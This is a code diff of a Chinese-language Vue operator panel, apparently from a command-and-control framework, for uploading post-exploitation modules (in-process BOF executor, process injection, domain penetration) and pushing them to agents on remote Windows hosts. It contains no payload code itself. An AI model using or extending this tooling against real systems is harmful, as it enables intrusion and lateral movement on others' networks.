@@ -3,13 +3,14 @@
     <section class="surface-card module-card">
       <div class="panel-head">
         <div>
-          <span class="panel-kicker">L2 Modules × 3</span>
+          <span class="panel-kicker">模块能力 · L2 Modules</span>
           <h3>模块仓库</h3>
           <p class="hint">
-            产品仅三个独立模块：
-            <code>desktop</code>（远程桌面）、
-            <code>iso_host</code>（BOF/.NET 隔离宿主）、
-            <code>inject</code>（进程注入）。分文件、分推送。
+            <strong>模块能力</strong>（L2 产品模块，分模块推送）：
+            <code>bof</code>（进程内 BOF 执行器）、
+            <code>inject</code>（进程注入 worker）、
+            <code>ad</code>（域渗透 worker）。
+            与「插件能力」分离：插件是武器载荷，依赖对应模块。
           </p>
         </div>
         <el-button type="primary" :loading="loading" @click="refresh">
@@ -19,16 +20,16 @@
 
       <div class="workflow">
         <div class="step">
-          <strong>desktop</strong>
-          <span>RDP 3389 转发能力包</span>
-        </div>
-        <div class="step">
-          <strong>iso_host</strong>
-          <span>BOF/.NET 短命宿主 PE</span>
+          <strong>bof</strong>
+          <span>模块能力：bof（Agent 进程内经典 BOF，Manual-Map 无文件）</span>
         </div>
         <div class="step">
           <strong>inject</strong>
-          <span>远程 shellcode 注入 L2</span>
+          <span>模块能力：inject</span>
+        </div>
+        <div class="step">
+          <strong>ad</strong>
+          <span>模块能力：ad_ops</span>
         </div>
       </div>
 
@@ -37,10 +38,10 @@
       <el-form label-position="top" class="upload-form" @submit.prevent>
         <div class="form-row">
           <el-form-item label="模块 ID" required>
-            <el-select v-model="uploadForm.id" style="width: 200px">
-              <el-option label="desktop — 远程桌面" value="desktop" />
-              <el-option label="iso_host — BOF/.NET 宿主" value="iso_host" />
+            <el-select v-model="uploadForm.id" style="width: 240px">
+              <el-option label="bof — 进程内 BOF 执行器" value="bof" />
               <el-option label="inject — 进程注入" value="inject" />
+              <el-option label="ad — 域渗透 worker" value="ad" />
             </el-select>
           </el-form-item>
           <el-form-item label="模块文件 (.exe / .dll / .bin)" required>
@@ -54,17 +55,49 @@
         </div>
       </el-form>
 
-      <el-table :data="modules" v-loading="loading" empty-text="仓库为空 — 请先上传 iso_host">
-        <el-table-column prop="id" label="ID" width="120" />
-        <el-table-column prop="name" label="名称" width="140" />
-        <el-table-column prop="description" label="描述" min-width="240" show-overflow-tooltip />
+      <el-table :data="modules" v-loading="loading" empty-text="仓库为空 — 请先上传 bof / inject / ad">
+        <el-table-column prop="id" label="ID" width="100" />
+        <el-table-column prop="name" label="名称" width="120" />
+        <el-table-column prop="description" label="描述" min-width="200" show-overflow-tooltip />
         <el-table-column prop="kind" label="类型" width="90">
           <template #default="{ row }">
             <el-tag size="small" :type="kindTag(row.kind)">{{ kindLabel(row.kind) }}</el-tag>
           </template>
         </el-table-column>
-        <el-table-column label="大小" width="100">
+        <el-table-column label="模块能力" min-width="160">
+          <template #default="{ row }">
+            <div class="cap-row">
+              <el-tag
+                v-for="cap in (row.capabilities || [])"
+                :key="cap"
+                size="small"
+                type="warning"
+                effect="plain"
+                class="cap-tag"
+              >{{ cap }}</el-tag>
+              <span v-if="!(row.capabilities || []).length" class="muted">—</span>
+            </div>
+          </template>
+        </el-table-column>
+        <el-table-column label="签名/版本" width="140">
+          <template #default="{ row }">
+            <el-tag size="small" :type="row.signed ? 'success' : 'info'" effect="plain">
+              {{ row.signed ? '已签名' : '未签名' }}
+            </el-tag>
+            <div class="ver-line">{{ row.version || '—' }}</div>
+          </template>
+        </el-table-column>
+        <el-table-column label="大小" width="90">
           <template #default="{ row }">{{ formatSize(row.size) }}</template>
+        </el-table-column>
+        <el-table-column label="目标状态" width="110">
+          <template #default="{ row }">
+            <el-tag v-if="isPushedAlive(row.id)" size="small" type="success" effect="dark">
+              {{ row.id === 'bof' ? '已映射就绪' : '已就绪' }}
+            </el-tag>
+            <el-tag v-else-if="pushTarget[row.id]" size="small" type="info">未就绪</el-tag>
+            <span v-else class="muted">选主机</span>
+          </template>
         </el-table-column>
         <el-table-column label="操作" min-width="420" fixed="right">
           <template #default="{ row }">
@@ -82,22 +115,27 @@
                 :key="c.uuid"
                 :label="`${c.hostname || c.uuid.slice(0, 8)} (${c.ip || '-'})`"
                 :value="c.uuid"
+                :disabled="!targetIsCompatible(c.uuid, row.id)"
               />
             </el-select>
             <el-button
               size="small"
               type="primary"
               :loading="pushing === row.id"
-              :disabled="!pushTarget[row.id] || isPushedAlive(row.id)"
+              :disabled="!pushTarget[row.id] || isPushedAlive(row.id) || !targetIsCompatible(pushTarget[row.id], row.id)"
               @click="pushToAgent(row)"
             >
-              {{ isPushedAlive(row.id) ? '已在目标存活' : '推送' }}
+              {{ isPushedAlive(row.id)
+                ? (row.id === 'bof' ? '已映射就绪' : '已在目标就绪')
+                : (targetIsCompatible(pushTarget[row.id], row.id) ? '推送' : '平台不匹配') }}
             </el-button>
             <el-button
               v-if="isAdmin"
               size="small"
               type="danger"
               :loading="deleting === row.id"
+              :disabled="isPushedAlive(row.id)"
+              :title="isPushedAlive(row.id) ? '目标仍标记已加载，建议先换主机或确认后再删仓库' : '从仓库删除'"
               @click="deleteModule(row)"
             >
               删除
@@ -145,7 +183,7 @@ const userRole = (() => {
 const isAdmin = userRole === 'admin' || userRole === 'administrator'
 
 const uploadForm = reactive({
-  id: 'iso_host',
+  id: 'bof',
   file: null
 })
 
@@ -216,6 +254,16 @@ const onTargetChange = async (moduleId) => {
   }
 }
 
+// Simple client-side platform hint for UX (server still enforces).
+const moduleIsWindowsOnly = (id) => ['ad', 'inject', 'bof'].includes(id)
+const targetIsCompatible = (uuid, moduleId) => {
+  if (!moduleIsWindowsOnly(moduleId)) return true
+  const c = onlineClients.value.find((x) => x.uuid === uuid)
+  if (!c) return true
+  const os = (c.os || '').toLowerCase()
+  return os.includes('win')
+}
+
 const onFileChange = (e) => {
   uploadForm.file = e.target.files?.[0] || null
 }
@@ -256,11 +304,14 @@ const doUpload = async () => {
 }
 
 const deleteModule = async (row) => {
+  const aliveHint = isPushedAlive(row.id)
+    ? `\n注意：当前选中主机仍标记为已加载「${row.id}」，删除仅移除服务端仓库，不影响已推送内存态。`
+    : ''
   try {
     await ElMessageBox.confirm(
-      `确定从仓库删除模块「${row.name || row.id}」？磁盘 .bin 将一并移除。`,
-      '删除模块',
-      { type: 'warning', confirmButtonText: '删除', cancelButtonText: '取消' }
+      `确定从仓库删除模块「${row.name || row.id}」？\n将移除磁盘 .bin 与 trust 签名侧车。${aliveHint}`,
+      '删除模块（不可恢复）',
+      { type: 'warning', confirmButtonText: '确认删除', cancelButtonText: '取消', distinguishCancelAndClose: true }
     )
   } catch {
     return
@@ -282,7 +333,11 @@ const pushToAgent = async (row) => {
   const uuid = pushTarget[id]
   if (!uuid) return
   if (isPushedAlive(id)) {
-    ElMessage.info(`「${row.name || id}」已在该主机存活，无需重复推送`)
+    ElMessage.info(
+      id === 'bof'
+        ? 'bof 模块已在该主机映射就绪（进程内加载），无需重复推送'
+        : `「${row.name || id}」已在该主机就绪，无需重复推送`
+    )
     return
   }
   pushing.value = id
@@ -372,4 +427,8 @@ onMounted(refresh)
   align-items: flex-end;
 }
 .pack-alert { margin-top: 16px; }
+.cap-row { display: flex; flex-wrap: wrap; gap: 4px; }
+.cap-tag { margin: 0; }
+.ver-line { font-size: 11px; opacity: 0.65; margin-top: 4px; }
+.muted { opacity: 0.45; font-size: 12px; }
 </style>
